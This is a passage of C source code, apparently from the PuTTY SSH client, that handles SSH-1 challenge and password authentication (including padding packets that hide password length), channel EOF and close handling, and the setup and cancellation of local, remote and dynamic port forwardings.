{\n\t\tchar *challenge;\n\t\tint challengelen;\n\t\tchar *instr_suf, *prompt;\n\n\t\tssh_pkt_getstring(pktin, &challenge, &challengelen);\n\t\tif (!challenge) {\n\t\t    bombout((\"TIS challenge packet was badly formed\"));\n\t\t    crStop(0);\n\t\t}\n\t\tlogevent(\"Received TIS challenge\");\n\t\ts->cur_prompt->to_server = TRUE;\n\t\ts->cur_prompt->name = dupstr(\"SSH TIS authentication\");\n\t\t/* Prompt heuristic comes from OpenSSH */\n\t\tif (memchr(challenge, '\\n', challengelen)) {\n\t\t    instr_suf = dupstr(\"\");\n\t\t    prompt = dupprintf(\"%.*s\", challengelen, challenge);\n\t\t} else {\n\t\t    instr_suf = dupprintf(\"%.*s\", challengelen, challenge);\n\t\t    prompt = dupstr(\"Response: \");\n\t\t}\n\t\ts->cur_prompt->instruction =\n\t\t    dupprintf(\"Using TIS authentication.%s%s\",\n\t\t\t      (*instr_suf) ? \"\\n\" : \"\",\n\t\t\t      instr_suf);\n\t\ts->cur_prompt->instr_reqd = TRUE;\n\t\tadd_prompt(s->cur_prompt, prompt, FALSE);\n\t\tsfree(instr_suf);\n\t    }\n\t}\n\tif (conf_get_int(ssh->conf, CONF_try_tis_auth) &&\n\t    (s->supported_auths_mask & (1 << SSH1_AUTH_CCARD)) &&\n\t    !s->ccard_auth_refused) {\n\t    s->pwpkt_type = SSH1_CMSG_AUTH_CCARD_RESPONSE;\n\t    logevent(\"Requested CryptoCard authentication\");\n\t    send_packet(ssh, SSH1_CMSG_AUTH_CCARD, PKT_END);\n\t    crWaitUntil(pktin);\n\t    if (pktin->type != SSH1_SMSG_AUTH_CCARD_CHALLENGE) {\n\t\tlogevent(\"CryptoCard authentication declined\");\n\t\tc_write_str(ssh, \"CryptoCard authentication refused.\\r\\n\");\n\t\ts->ccard_auth_refused = 1;\n\t\tcontinue;\n\t    } else {\n\t\tchar *challenge;\n\t\tint challengelen;\n\t\tchar *instr_suf, *prompt;\n\n\t\tssh_pkt_getstring(pktin, &challenge, &challengelen);\n\t\tif (!challenge) {\n\t\t    bombout((\"CryptoCard challenge packet was badly formed\"));\n\t\t    crStop(0);\n\t\t}\n\t\tlogevent(\"Received CryptoCard challenge\");\n\t\ts->cur_prompt->to_server = TRUE;\n\t\ts->cur_prompt->name = dupstr(\"SSH CryptoCard authentication\");\n\t\ts->cur_prompt->name_reqd = FALSE;\n\t\t/* Prompt heuristic comes from OpenSSH */\n\t\tif (memchr(challenge, '\\n', challengelen)) {\n\t\t    instr_suf = dupstr(\"\");\n\t\t    prompt = dupprintf(\"%.*s\", challengelen, challenge);\n\t\t} else {\n\t\t    instr_suf = dupprintf(\"%.*s\", challengelen, challenge);\n\t\t    prompt = dupstr(\"Response: \");\n\t\t}\n\t\ts->cur_prompt->instruction =\n\t\t    dupprintf(\"Using CryptoCard authentication.%s%s\",\n\t\t\t      (*instr_suf) ? \"\\n\" : \"\",\n\t\t\t      instr_suf);\n\t\ts->cur_prompt->instr_reqd = TRUE;\n\t\tadd_prompt(s->cur_prompt, prompt, FALSE);\n\t\tsfree(instr_suf);\n\t    }\n\t}\n\tif (s->pwpkt_type == SSH1_CMSG_AUTH_PASSWORD) {\n\t    if ((s->supported_auths_mask & (1 << SSH1_AUTH_PASSWORD)) == 0) {\n\t\tbombout((\"No supported authentication methods available\"));\n\t\tcrStop(0);\n\t    }\n\t    s->cur_prompt->to_server = TRUE;\n\t    s->cur_prompt->name = dupstr(\"SSH password\");\n\t    add_prompt(s->cur_prompt, dupprintf(\"%s@%s's password: \",\n\t\t\t\t\t\tssh->username, ssh->savedhost),\n\t\t       FALSE);\n\t}\n\n\t/*\n\t * Show password prompt, having first obtained it via a TIS\n\t * or CryptoCard exchange if we're doing TIS or CryptoCard\n\t * authentication.\n\t */\n\t{\n\t    int ret; /* need not be kept over crReturn */\n\t    ret = get_userpass_input(s->cur_prompt, NULL, 0);\n\t    while (ret < 0) {\n\t\tssh->send_ok = 1;\n\t\tcrWaitUntil(!pktin);\n\t\tret = get_userpass_input(s->cur_prompt, in, inlen);\n\t\tssh->send_ok = 0;\n\t    }\n\t    if (!ret) {\n\t\t/*\n\t\t * Failed to get a password (for example\n\t\t * because one was supplied on the command line\n\t\t * which has already failed to work). Terminate.\n\t\t */\n\t\tfree_prompts(s->cur_prompt);\n\t\tssh_disconnect(ssh, NULL, \"Unable to authenticate\", 0, TRUE);\n\t\tcrStop(0);\n\t    }\n\t}\n\n\tif (s->pwpkt_type == SSH1_CMSG_AUTH_PASSWORD) {\n\t    /*\n\t     * Defence against traffic analysis: we send a\n\t     * whole bunch of packets containing strings of\n\t     * different lengths. One of these strings is the\n\t     * password, in a SSH1_CMSG_AUTH_PASSWORD packet.\n\t     * The others are all random data in\n\t     * SSH1_MSG_IGNORE packets. This way a passive\n\t     * listener can't tell which is the password, and\n\t     * hence can't deduce the password length.\n\t     * \n\t     * Anybody with a password length greater than 16\n\t     * bytes is going to have enough entropy in their\n\t     * password that a listener won't find it _that_\n\t     * much help to know how long it is. So what we'll\n\t     * do is:\n\t     * \n\t     *  - if password length < 16, we send 15 packets\n\t     *    containing string lengths 1 through 15\n\t     * \n\t     *  - otherwise, we let N be the nearest multiple\n\t     *    of 8 below the password length, and send 8\n\t     *    packets containing string lengths N through\n\t     *    N+7. This won't obscure the order of\n\t     *    magnitude of the password length, but it will\n\t     *    introduce a bit of extra uncertainty.\n\t     * \n\t     * A few servers can't deal with SSH1_MSG_IGNORE, at\n\t     * least in this context. For these servers, we need\n\t     * an alternative defence. We make use of the fact\n\t     * that the password is interpreted as a C string:\n\t     * so we can append a NUL, then some random data.\n\t     * \n\t     * A few servers can deal with neither SSH1_MSG_IGNORE\n\t     * here _nor_ a padded password string.\n\t     * For these servers we are left with no defences\n\t     * against password length sniffing.\n\t     */\n\t    if (!(ssh->remote_bugs & BUG_CHOKES_ON_SSH1_IGNORE) &&\n\t        !(ssh->remote_bugs & BUG_NEEDS_SSH1_PLAIN_PASSWORD)) {\n\t\t/*\n\t\t * The server can deal with SSH1_MSG_IGNORE, so\n\t\t * we can use the primary defence.\n\t\t */\n\t\tint bottom, top, pwlen, i;\n\t\tchar *randomstr;\n\n\t\tpwlen = strlen(s->cur_prompt->prompts[0]->result);\n\t\tif (pwlen < 16) {\n\t\t    bottom = 0;    /* zero length passwords are OK! :-) */\n\t\t    top = 15;\n\t\t} else {\n\t\t    bottom = pwlen & ~7;\n\t\t    top = bottom + 7;\n\t\t}\n\n\t\tassert(pwlen >= bottom && pwlen <= top);\n\n\t\trandomstr = snewn(top + 1, char);\n\n\t\tfor (i = bottom; i <= top; i++) {\n\t\t    if (i == pwlen) {\n\t\t\tdefer_packet(ssh, s->pwpkt_type,\n                                     PKT_STR,s->cur_prompt->prompts[0]->result,\n\t\t\t\t     PKT_END);\n\t\t    } else {\n\t\t\tfor (j = 0; j < i; j++) {\n\t\t\t    do {\n\t\t\t\trandomstr[j] = random_byte();\n\t\t\t    } while (randomstr[j] == '\\0');\n\t\t\t}\n\t\t\trandomstr[i] = '\\0';\n\t\t\tdefer_packet(ssh, SSH1_MSG_IGNORE,\n\t\t\t\t     PKT_STR, randomstr, PKT_END);\n\t\t    }\n\t\t}\n\t\tlogevent(\"Sending password with camouflage packets\");\n\t\tssh_pkt_defersend(ssh);\n\t\tsfree(randomstr);\n\t    } \n\t    else if (!(ssh->remote_bugs & BUG_NEEDS_SSH1_PLAIN_PASSWORD)) {\n\t\t/*\n\t\t * The server can't deal with SSH1_MSG_IGNORE\n\t\t * but can deal with padded passwords, so we\n\t\t * can use the secondary defence.\n\t\t */\n\t\tchar string[64];\n\t\tchar *ss;\n\t\tint len;\n\n\t\tlen = strlen(s->cur_prompt->prompts[0]->result);\n\t\tif (len < sizeof(string)) {\n\t\t    ss = string;\n\t\t    strcpy(string, s->cur_prompt->prompts[0]->result);\n\t\t    len++;\t       /* cover the zero byte */\n\t\t    while (len < sizeof(string)) {\n\t\t\tstring[len++] = (char) random_byte();\n\t\t    }\n\t\t} else {\n\t\t    ss = s->cur_prompt->prompts[0]->result;\n\t\t}\n\t\tlogevent(\"Sending length-padded password\");\n\t\tsend_packet(ssh, s->pwpkt_type,\n\t\t\t    PKT_INT, len, PKT_DATA, ss, len,\n\t\t\t    PKT_END);\n\t    } else {\n\t\t/*\n\t\t * The server is believed unable to cope with\n\t\t * any of our password camouflage methods.\n\t\t */\n\t\tint len;\n\t\tlen = strlen(s->cur_prompt->prompts[0]->result);\n\t\tlogevent(\"Sending unpadded password\");\n\t\tsend_packet(ssh, s->pwpkt_type,\n                            PKT_INT, len,\n\t\t\t    PKT_DATA, s->cur_prompt->prompts[0]->result, len,\n\t\t\t    PKT_END);\n\t    }\n\t} else {\n\t    send_packet(ssh, s->pwpkt_type,\n\t\t\tPKT_STR, s->cur_prompt->prompts[0]->result,\n\t\t\tPKT_END);\n\t}\n\tlogevent(\"Sent password\");\n\tfree_prompts(s->cur_prompt);\n\tcrWaitUntil(pktin);\n\tif (pktin->type == SSH1_SMSG_FAILURE) {\n\t    if (flags & FLAG_VERBOSE)\n\t\tc_write_str(ssh, \"Access denied\\r\\n\");\n\t    logevent(\"Authentication refused\");\n\t} else if (pktin->type != SSH1_SMSG_SUCCESS) {\n\t    bombout((\"Strange packet received, type %d\", pktin->type));\n\t    crStop(0);\n\t}\n    }\n\n    /* Clear up */\n    if (s->publickey_blob) {\n\tsfree(s->publickey_blob);\n\tsfree(s->publickey_comment);\n    }\n\n    logevent(\"Authentication successful\");\n\n    crFinish(1);\n}\n\nstatic void ssh_channel_try_eof(struct ssh_channel *c)\n{\n    Ssh ssh = c->ssh;\n    assert(c->pending_eof);          /* precondition for calling us */\n    if (c->halfopen)\n        return;                 /* can't close: not even opened yet */\n    if (ssh->version == 2 && bufchain_size(&c->v.v2.outbuffer) > 0)\n        return;              /* can't send EOF: pending outgoing data */\n\n    c->pending_eof = FALSE;            /* we're about to send it */\n    if (ssh->version == 1) {\n        send_packet(ssh, SSH1_MSG_CHANNEL_CLOSE, PKT_INT, c->remoteid,\n                    PKT_END);\n        c->closes |= CLOSES_SENT_EOF;\n    } else {\n        struct Packet *pktout;\n        pktout = ssh2_pkt_init(SSH2_MSG_CHANNEL_EOF);\n        ssh2_pkt_adduint32(pktout, c->remoteid);\n        ssh2_pkt_send(ssh, pktout);\n        c->closes |= CLOSES_SENT_EOF;\n\tssh2_channel_check_close(c);\n    }\n}\n\nConf *sshfwd_get_conf(struct ssh_channel *c)\n{\n    Ssh ssh = c->ssh;\n    return ssh->conf;\n}\n\nvoid sshfwd_write_eof(struct ssh_channel *c)\n{\n    Ssh ssh = c->ssh;\n\n    if (ssh->state == SSH_STATE_CLOSED)\n\treturn;\n\n    if (c->closes & CLOSES_SENT_EOF)\n        return;\n\n    c->pending_eof = TRUE;\n    ssh_channel_try_eof(c);\n}\n\nvoid sshfwd_unclean_close(struct ssh_channel *c, const char *err)\n{\n    Ssh ssh = c->ssh;\n    char *reason;\n\n    if (ssh->state == SSH_STATE_CLOSED)\n\treturn;\n\n    reason = dupprintf(\"due to local error: %s\", err);\n    ssh_channel_close_local(c, reason);\n    sfree(reason);\n    c->pending_eof = FALSE;   /* this will confuse a zombie channel */\n\n    ssh2_channel_check_close(c);\n}\n\nint sshfwd_write(struct ssh_channel *c, char *buf, int len)\n{\n    Ssh ssh = c->ssh;\n\n    if (ssh->state == SSH_STATE_CLOSED)\n\treturn 0;\n\n    return ssh_send_channel_data(c, buf, len);\n}\n\nvoid sshfwd_unthrottle(struct ssh_channel *c, int bufsize)\n{\n    Ssh ssh = c->ssh;\n\n    if (ssh->state == SSH_STATE_CLOSED)\n\treturn;\n\n    ssh_channel_unthrottle(c, bufsize);\n}\n\nstatic void ssh_queueing_handler(Ssh ssh, struct Packet *pktin)\n{\n    struct queued_handler *qh = ssh->qhead;\n\n    assert(qh != NULL);\n\n    assert(pktin->type == qh->msg1 || pktin->type == qh->msg2);\n\n    if (qh->msg1 > 0) {\n\tassert(ssh->packet_dispatch[qh->msg1] == ssh_queueing_handler);\n\tssh->packet_dispatch[qh->msg1] = ssh->q_saved_handler1;\n    }\n    if (qh->msg2 > 0) {\n\tassert(ssh->packet_dispatch[qh->msg2] == ssh_queueing_handler);\n\tssh->packet_dispatch[qh->msg2] = ssh->q_saved_handler2;\n    }\n\n    if (qh->next) {\n\tssh->qhead = qh->next;\n\n\tif (ssh->qhead->msg1 > 0) {\n\t    ssh->q_saved_handler1 = ssh->packet_dispatch[ssh->qhead->msg1];\n\t    ssh->packet_dispatch[ssh->qhead->msg1] = ssh_queueing_handler;\n\t}\n\tif (ssh->qhead->msg2 > 0) {\n\t    ssh->q_saved_handler2 = ssh->packet_dispatch[ssh->qhead->msg2];\n\t    ssh->packet_dispatch[ssh->qhead->msg2] = ssh_queueing_handler;\n\t}\n    } else {\n\tssh->qhead = ssh->qtail = NULL;\n    }\n\n    qh->handler(ssh, pktin, qh->ctx);\n\n    sfree(qh);\n}\n\nstatic void ssh_queue_handler(Ssh ssh, int msg1, int msg2,\n\t\t\t      chandler_fn_t handler, void *ctx)\n{\n    struct queued_handler *qh;\n\n    qh = snew(struct queued_handler);\n    qh->msg1 = msg1;\n    qh->msg2 = msg2;\n    qh->handler = handler;\n    qh->ctx = ctx;\n    qh->next = NULL;\n\n    if (ssh->qtail == NULL) {\n\tssh->qhead = qh;\n\n\tif (qh->msg1 > 0) {\n\t    ssh->q_saved_handler1 = ssh->packet_dispatch[ssh->qhead->msg1];\n\t    ssh->packet_dispatch[qh->msg1] = ssh_queueing_handler;\n\t}\n\tif (qh->msg2 > 0) {\n\t    ssh->q_saved_handler2 = ssh->packet_dispatch[ssh->qhead->msg2];\n\t    ssh->packet_dispatch[qh->msg2] = ssh_queueing_handler;\n\t}\n    } else {\n\tssh->qtail->next = qh;\n    }\n    ssh->qtail = qh;\n}\n\nstatic void ssh_rportfwd_succfail(Ssh ssh, struct Packet *pktin, void *ctx)\n{\n    struct ssh_rportfwd *rpf, *pf = (struct ssh_rportfwd *)ctx;\n\n    if (pktin->type == (ssh->version == 1 ? SSH1_SMSG_SUCCESS :\n\t\t\tSSH2_MSG_REQUEST_SUCCESS)) {\n\tlogeventf(ssh, \"Remote port forwarding from %s enabled\",\n\t\t  pf->sportdesc);\n    } else {\n\tlogeventf(ssh, \"Remote port forwarding from %s refused\",\n\t\t  pf->sportdesc);\n\n\trpf = del234(ssh->rportfwds, pf);\n\tassert(rpf == pf);\n\tpf->pfrec->remote = NULL;\n\tfree_rportfwd(pf);\n    }\n}\n\nint ssh_alloc_sharing_rportfwd(Ssh ssh, const char *shost, int sport,\n                               void *share_ctx)\n{\n    struct ssh_rportfwd *pf = snew(struct ssh_rportfwd);\n    pf->dhost = NULL;\n    pf->dport = 0;\n    pf->share_ctx = share_ctx;\n    pf->shost = dupstr(shost);\n    pf->sport = sport;\n    pf->sportdesc = NULL;\n    if (!ssh->rportfwds) {\n        assert(ssh->version == 2);\n        ssh->rportfwds = newtree234(ssh_rportcmp_ssh2);\n    }\n    if (add234(ssh->rportfwds, pf) != pf) {\n        sfree(pf->shost);\n        sfree(pf);\n        return FALSE;\n    }\n    return TRUE;\n}\n\nstatic void ssh_sharing_global_request_response(Ssh ssh, struct Packet *pktin,\n                                                void *ctx)\n{\n    share_got_pkt_from_server(ctx, pktin->type,\n                              pktin->body, pktin->length);\n}\n\nvoid ssh_sharing_queue_global_request(Ssh ssh, void *share_ctx)\n{\n    ssh_queue_handler(ssh, SSH2_MSG_REQUEST_SUCCESS, SSH2_MSG_REQUEST_FAILURE,\n                      ssh_sharing_global_request_response, share_ctx);\n}\n\nstatic void ssh_setup_portfwd(Ssh ssh, Conf *conf)\n{\n    struct ssh_portfwd *epf;\n    int i;\n    char *key, *val;\n\n    if (!ssh->portfwds) {\n\tssh->portfwds = newtree234(ssh_portcmp);\n    } else {\n\t/*\n\t * Go through the existing port forwardings and tag them\n\t * with status==DESTROY. Any that we want to keep will be\n\t * re-enabled (status==KEEP) as we go through the\n\t * configuration and find out which bits are the same as\n\t * they were before.\n\t */\n\tstruct ssh_portfwd *epf;\n\tint i;\n\tfor (i = 0; (epf = index234(ssh->portfwds, i)) != NULL; i++)\n\t    epf->status = DESTROY;\n    }\n\n    for (val = conf_get_str_strs(conf, CONF_portfwd, NULL, &key);\n\t val != NULL;\n\t val = conf_get_str_strs(conf, CONF_portfwd, key, &key)) {\n\tchar *kp, *kp2, *vp, *vp2;\n\tchar address_family, type;\n\tint sport,dport,sserv,dserv;\n\tchar *sports, *dports, *saddr, *host;\n\n\tkp = key;\n\n\taddress_family = 'A';\n\ttype = 'L';\n\tif (*kp == 'A' || *kp == '4' || *kp == '6')\n\t    address_family = *kp++;\n\tif (*kp == 'L' || *kp == 'R')\n\t    type = *kp++;\n\n\tif ((kp2 = host_strchr(kp, ':')) != NULL) {\n\t    /*\n\t     * There's a colon in the middle of the source port\n\t     * string, which means that the part before it is\n\t     * actually a source address.\n\t     */\n\t    char *saddr_tmp = dupprintf(\"%.*s\", (int)(kp2 - kp), kp);\n            saddr = host_strduptrim(saddr_tmp);\n            sfree(saddr_tmp);\n\t    sports = kp2+1;\n\t} else {\n\t    saddr = NULL;\n\t    sports = kp;\n\t}\n\tsport = atoi(sports);\n\tsserv = 0;\n\tif (sport == 0) {\n\t    sserv = 1;\n\t    sport = net_service_lookup(sports);\n\t    if (!sport) {\n\t\tlogeventf(ssh, \"Service lookup failed for source\"\n\t\t\t  \" port \\\"%s\\\"\", sports);\n\t    }\n\t}\n\n\tif (type == 'L' && !strcmp(val, \"D\")) {\n            /* dynamic forwarding */\n\t    host = NULL;\n\t    dports = NULL;\n\t    dport = -1;\n\t    dserv = 0;\n            type = 'D';\n        } else {\n            /* ordinary forwarding */\n\t    vp = val;\n\t    vp2 = vp + host_strcspn(vp, \":\");\n\t    host = dupprintf(\"%.*s\", (int)(vp2 - vp), vp);\n\t    if (*vp2)\n\t\tvp2++;\n\t    dports = vp2;\n\t    dport = atoi(dports);\n\t    dserv = 0;\n\t    if (dport == 0) {\n\t\tdserv = 1;\n\t\tdport = net_service_lookup(dports);\n\t\tif (!dport) {\n\t\t    logeventf(ssh, \"Service lookup failed for destination\"\n\t\t\t      \" port \\\"%s\\\"\", dports);\n\t\t}\n\t    }\n\t}\n\n\tif (sport && dport) {\n\t    /* Set up a description of the source port. */\n\t    struct ssh_portfwd *pfrec, *epfrec;\n\n\t    pfrec = snew(struct ssh_portfwd);\n\t    pfrec->type = type;\n\t    pfrec->saddr = saddr;\n\t    pfrec->sserv = sserv ? dupstr(sports) : NULL;\n\t    pfrec->sport = sport;\n\t    pfrec->daddr = host;\n\t    pfrec->dserv = dserv ? dupstr(dports) : NULL;\n\t    pfrec->dport = dport;\n\t    pfrec->local = NULL;\n\t    pfrec->remote = NULL;\n\t    pfrec->addressfamily = (address_family == '4' ? ADDRTYPE_IPV4 :\n\t\t\t\t    address_family == '6' ? ADDRTYPE_IPV6 :\n\t\t\t\t    ADDRTYPE_UNSPEC);\n\n\t    epfrec = add234(ssh->portfwds, pfrec);\n\t    if (epfrec != pfrec) {\n\t\tif (epfrec->status == DESTROY) {\n\t\t    /*\n\t\t     * We already have a port forwarding up and running\n\t\t     * with precisely these parameters. Hence, no need\n\t\t     * to do anything; simply re-tag the existing one\n\t\t     * as KEEP.\n\t\t     */\n\t\t    epfrec->status = KEEP;\n\t\t}\n\t\t/*\n\t\t * Anything else indicates that there was a duplicate\n\t\t * in our input, which we'll silently ignore.\n\t\t */\n\t\tfree_portfwd(pfrec);\n\t    } else {\n\t\tpfrec->status = CREATE;\n\t    }\n\t} else {\n\t    sfree(saddr);\n\t    sfree(host);\n\t}\n    }\n\n    /*\n     * Now go through and destroy any port forwardings which were\n     * not re-enabled.\n     */\n    for (i = 0; (epf = index234(ssh->portfwds, i)) != NULL; i++)\n\tif (epf->status == DESTROY) {\n\t    char *message;\n\n\t    message = dupprintf(\"%s port forwarding from %s%s%d\",\n\t\t\t\tepf->type == 'L' ? \"local\" :\n\t\t\t\tepf->type == 'R' ? \"remote\" : \"dynamic\",\n\t\t\t\tepf->saddr ? epf->saddr : \"\",\n\t\t\t\tepf->saddr ? \":\" : \"\",\n\t\t\t\tepf->sport);\n\n\t    if (epf->type != 'D') {\n\t\tchar *msg2 = dupprintf(\"%s to %s:%d\", message,\n\t\t\t\t       epf->daddr, epf->dport);\n\t\tsfree(message);\n\t\tmessage = msg2;\n\t    }\n\n\t    logeventf(ssh, \"Cancelling %s\", message);\n\t    sfree(message);\n\n\t    /* epf->remote or epf->local may be NULL if setting up a\n\t     * forwarding failed. */\n\t    if (epf->remote) {\n\t\tstruct ssh_rportfwd *rpf = epf->remote;\n\t\tstruct Packet *pktout;\n\n\t\t/*\n\t\t * Cancel the port forwarding at the server\n\t\t * end.\n\t\t */\n\t\tif (ssh->version == 1) {\n\t\t    /*\n\t\t     * We cannot cancel listening ports on the\n\t\t     * server side in SSH-1! There's no message\n\t\t     * to support it. Instead, we simply remove\n\t\t     * the rportfwd record from the local end\n\t\t     * so that any connections the server tries\n\t\t     * to make on it are rejected.\n\t\t     */\n\t\t} else {\n\t\t    pktout = ssh2_pkt_init(SSH2_MSG_GLOBAL_REQUEST);\n\t\t    ssh2_pkt_addstring(pktout, \"cancel-tcpip-forward\");\n\t\t    ssh2_pkt_addbool(pktout, 0);/* _don't_ want reply */\n\t\t    if (epf->saddr) {\n\t\t\tssh2_pkt_addstring(pktout, epf->saddr);\n\t\t    } else if (conf_get_int(conf, CONF_rport_acceptall)) {\n\t\t\t/* XXX: rport_acceptall may not represent\n\t\t\t * what was used to open the original connection,\n\t\t\t * since it's reconfigurable. */\n\t\t\tssh2_pkt_addstring(pktout, \"\");\n\t\t    } else {\n\t\t\tssh2_pkt_addstring(pktout, \"localhost\");\n\t\t    }\n\t\t    ssh2_pkt_adduint32(pktout, epf->sport);\n\t\t    ssh2_pkt_send(ssh, pktout);\n\t\t}\n\n\t\tdel234(ssh->rportfwds, rpf);\n\t\tfree_rportfwd(rpf);\n\t    } else if (epf->local) {\n\t\tpfl_terminate(epf->local);\n\t    }\n\n\t    delpos234(ssh->portfwds, i);\n\t    free_portfwd(epf);\n\t    i--;\t\t       /* so we don't skip one in the list */\n\t}\n\n    /*\n     * And finally, set up any new port forwardings (status==CREATE).\n     */\n    for (i = 0; (epf = index234(ssh->portfwds, i)) != NULL; i++)\n\tif (epf->status == CREATE) {\n\t    char *sportdesc, *dportdesc;\n\t    sportdesc = dupprintf(\"%s%s%s%s%d%s\",\n\t\t\t\t  epf->saddr ? epf->saddr : \"\",\n\t\t\t\t  epf->saddr ? \":\" : \"\",\n\t\t\t\t  epf->sserv ? epf->sserv : \"\",\n\t\t\t\t  epf->sserv ? \"(\" : \"\",\n\t\t\t\t  epf->sport,\n\t\t\t\t  epf->sserv ? \")\" : \"\");\n\t    if (epf->type == 'D') {\n\t\tdportdesc = NULL;\n\t    } else {\n\t\tdportdesc = dupprintf(\"%s:%s%s%d%s\",\n\t\t\t\t      epf->daddr,\n\t\t\t\t      epf->dserv ? epf->dserv : \"\",\n\t\t\t\t      epf->dserv ? \"(\" : \"\",\n\t\t\t\t      epf->dport,\n\t\t\t\t      epf->dserv ? \")\" : \"\");\n\t    }\n\n\t    if (epf->type == 'L') {\n                char *err = pfl_listen(epf->daddr, epf->dport,\n                                       epf->saddr, epf->sport,\n                                       ssh, conf, &epf->local,\n                                       epf->addressfamily);\n\n\t\tlogeventf(ssh, \"Local %sport %s forwarding to %s%s%s\",\n\t\t\t  epf->addressfamily == ADDRTYPE_IPV4 ? \"IPv4 \" :\n\t\t\t  epf->addressfamily == ADDRTYPE_IPV6 ? \"IPv6 \" : \"\",\n\t\t\t  sportdesc, dportdesc,\n\t\t\t  err ? \" failed: \" : \"\", err ? err : \"\");\n                if (err)\n                    sfree(err);\n\t    } else if (epf->type == 'D') {\n\t\tchar *err = pfl_listen(NULL, -1, epf->saddr, epf->sport,\n                                       ssh, conf, &epf->local,\n                                       epf->addressfamily);\n\n\t\tlogeventf(ssh, \"Local %sport %s SOCKS dynamic forwarding%s%s\",\n\t\t\t  epf->addressfamily == ADDRTYPE_IPV4 ? \"IPv4 \" :\n\t\t\t  epf->addressfamily == ADDRTYPE_IPV6 ? \"IPv6 \" : \"\",\n\t\t\t  sportdesc,\n\t\t\t  err ? \" failed: \" : \"\", err ? err : \"\");\n\n                if (err)\n                    sfree(err);\n\t    } else {\n\t\tstruct ssh_rportfwd *pf;\n\n\t\t/*\n\t\t * Ensure the remote port forwardings tree exists.\n\t\t */\n\t\tif (!ssh->rportfwds) {\n\t\t    if (ssh->version == 1)\n\t\t\tssh->rportfwds = newtree234(ssh_rportcmp_ssh1);\n\t\t    else\n\t\t\tssh->rportfwds = newtree234(ssh_rportcmp_ssh2);\n\t\t}\n\n\t\tpf = snew(struct ssh_rportfwd);\n                pf->share_ctx = NULL;\n                pf->dhost = dupstr(epf->daddr);\n\t\tpf->dport = epf->dport;\n                if (epf->saddr) {\n                    pf->shost = dupstr(epf->saddr);\n                } else if (conf_get_int(conf, CONF_rport_acceptall)) {\n                    pf->shost = dupstr(\"\");\n                } else {\n                    pf->shost = dupstr(\"localhost\");\n                }\n\t\tpf->sport = epf->sport;\n\t\tif (add234(ssh->rportfwds, pf) != pf) {\n\t\t    logeventf(ssh, \"Duplicate remote port forwarding to %s:%d\",\n\t\t\t      epf->daddr, epf->dport);\n\t\t    sfree(pf);\n\t\t} else {\n\t\t    logeventf(ssh, \"Requesting remote port %s\"\n\t\t\t      \" forward to %s\", sportdesc, dportdesc);\n\n\t\t    pf->sportdesc = sportdesc;\n\t\t    sportdesc = NULL;\n\t\t    epf->remote = pf;\n\t\t    pf->pfrec = epf;\n\n\t\t    if (ssh->version == 1) {\n\t\t\tsend_packet(ssh, SSH1_CMSG_PORT_FORWARD_REQUEST,\n\t\t\t\t    PKT_INT, epf->sport,\n\t\t\t\t    PKT_STR, epf->daddr,\n\t\t\t\t    PKT_INT, epf->dport,\n\t\t\t\t    PKT_END);\n\t\t\tssh_queue_handler(ssh, SSH1_SMSG_SUCCESS,\n\t\t\t\t\t  SSH1_SMSG_FAILURE,\n\t\t\t\t\t  ssh_rportfwd_succfail, pf);\n\t\t    } else {\n\t\t\tstruct Packet *pktout;\n\t\t\tpktout = ssh2_pkt_init(SSH2_MSG_GLOBAL_REQUEST);\n\t\t\tssh2_pkt_addstring(pktout, \"tcpip-forward\");\n\t\t\tssh2_pkt_addbool(pktout, 1);/* want reply */\n\t\t\tssh2_pkt_addstring(pktout, pf->shost);\n\t\t\tssh2_pkt_adduint32(pktout, pf->sport);\n\t\t\tssh2_pkt_send(ssh, pktout);\n\n\t\t\tssh_queue_handler(ssh, SSH2_MSG_REQUEST_SUCCESS,\n\t\t\t\t\t  SSH2_MSG_REQUEST_FAILURE,\n\t\t\t\t\t  ssh_rportfwd_succfail, pf);\n\t\t    }\n\t\t}\n\t    }\n\t    sfree(sportdesc);\n\t    sfree(dportdesc);\n\t}\n}\n\nstatic void ssh1_smsg_stdout_stderr_data(Ssh ssh, struct Packet *pktin)\n{\n    char *string;\n    int stringlen, bufsize;\n\n    ssh_pkt_getstring(pktin, &string, &stringlen);\n    if (string == NULL) {\n\tbombout((\"Incoming terminal data packet was badly formed\"));\n\treturn;\n    }\n\n    bufsize = from_backend(ssh->frontend, pktin->type == SSH1_SMSG_STDERR_DATA,\n\t\t\t   string, stringlen);\n    if (!ssh->v1_stdout_throttling && bufsize > SSH1_BUFFER_LIMIT) {\n\tssh->v1_stdout_throttling = 1;\n\tssh_throttle_conn(ssh, +1);\n    }\n}\n\nstatic void ssh1_smsg_x11_open(Ssh ssh, struct Packet *pktin)\n{\n    /* Remote side is trying to open a channel to talk to our\n     * X-Server. Give them back a local channel number. */\n    struct ssh_channel *c;\n    int remoteid = ssh_pkt_getuint32(pktin);\n\n    logevent(\"Received X11 connect request\");\n    /* Refuse if X11 forwarding is disabled. */\n    if (!ssh->X11_fwd_enabled) {\n\tsend_packet(ssh, SSH1_MSG_CHANNEL_OPEN_FAILURE,\n\t\t    PKT_INT, remoteid, PKT_END);\n\tlogevent(\"Rejected X11 connect request\");\n    } else {\n\tc = snew(struct ssh_channel);\n\tc->ssh = ssh;\n\n\tssh_channel_init(c);\n\tc->u.x11.xconn = x11_init(ssh->x11authtree, c, NULL, -1);\n        c->remoteid = remoteid;\n        c->halfopen = FALSE;\n        c->type = CHAN_X11;\t/* identify channel type */\n        send_packet(ssh, SSH1_MSG_CHANNEL_OPEN_CONFIRMATION,\n                    PKT_INT, c->remoteid, PKT_INT,\n                    c->localid, PKT_END);\n        logevent(\"Opened X11 forward channel\");\n    }\n}\n\nstatic void ssh1_smsg_agent_open(Ssh ssh, struct Packet *pktin)\n{\n    /* Remote side is trying to open a channel to talk to our\n     * agent. Give them back a local channel number. */\n    struct ssh_channel *c;\n    int remoteid = ssh_pkt_getuint32(pktin);\n\n    /* Refuse if agent forwarding is disabled. */\n    if (!ssh->agentfwd_enabled) {\n\tsend_packet(ssh, SSH1_MSG_CHANNEL_OPEN_FAILURE,\n\t\t    PKT_INT, remoteid, PKT_END);\n    } else {\n\tc = snew(struct ssh_channel);\n\tc->ssh = ssh;\n\tssh_channel_init(c);\n\tc->remoteid = remoteid;\n\tc->halfopen = FALSE;\n\tc->type = CHAN_AGENT;\t/* identify channel type */\n\tc->u.a.lensofar = 0;\n\tc->u.a.message = NULL;\n\tc->u.a.pending = NULL;\n\tc->u.a.outstanding_requests = 0;\n\tsend_packet(ssh, SSH1_MSG_CHANNEL_OPEN_CONFIRMATION,\n\t\t    PKT_INT, c->remoteid, PKT_INT, 